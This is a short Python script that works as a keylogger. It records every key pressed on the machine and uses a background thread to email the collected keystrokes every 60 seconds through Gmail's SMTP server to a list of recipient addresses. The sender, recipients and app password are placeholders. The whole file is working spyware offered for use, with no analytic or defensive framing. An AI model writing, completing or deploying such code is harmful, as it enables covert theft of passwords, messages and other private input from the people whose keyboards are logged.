import keyboard
import smtplib
from email.mime.text import MIMEText
from time import sleep
import threading

subject = 'Keys'
body = []
body1 = ' '
sender = 'example@gmail.com'
recipients = 'gmail1@gmail.com','email2@outlook.com'
password = 'Put you google App password here'


exit_flag = False

def on_key_press(event):
    global body
    body.append(event.name)
    print(body)
    if event.name == 'esc':
        exit_program()

def send_email(subject, body, sender, recipients, password):
    msg = MIMEText(body1.join(map(str, body)))
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = ', '.join(recipients)
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
        smtp_server.login(sender, password)
        smtp_server.sendmail(sender, recipients, msg.as_string())
    print("Message sent!")

def back():
    while not exit_flag:
        send_email(subject, body, sender, recipients, password)
        sleep(60)

def exit_program():
    print("Exiting program...")
    global exit_flag
    exit_flag = True
    
    exit(0)

b = threading.Thread(name='background', target=back)
b.start()

keyboard.on_press(on_key_press)

# This loop is added to prevent the main thread from exiting immediately
while True:
    if exit_flag:
        break
b.join()
print("ended")    
